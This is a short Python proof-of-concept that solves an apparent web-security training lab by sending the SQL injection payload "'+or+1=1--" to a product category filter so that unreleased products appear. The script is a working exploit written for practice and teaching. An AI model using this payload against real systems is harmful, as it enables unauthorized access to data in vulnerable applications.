# This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
# SELECT * FROM products WHERE category = 'Gifts' AND released = 1
# To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
# PoC Script Credit to SamH

import requests 
import sys


def check_url(raw_url):
    return raw_url.rstrip('/')


args = sys.argv[1:]

try:
    raw_url = args[0]
    base_url = check_url(raw_url)
except:
    print("[!] Error\nUsage: python3 lab-simple.py <lab_url>")

vuln_url = base_url + "/filter?category=Accessories"
payload = "'+or+1=1--"

try:
    response = requests.get(vuln_url + payload)
    if response.status_code == 200:
        print("[+] Done!")
        print(response.status_code)
    else:
        print(response.status_code)
        print(response.content)
except:
    print("[!] Error\nUsage: python3 poc.py <lab_url>")


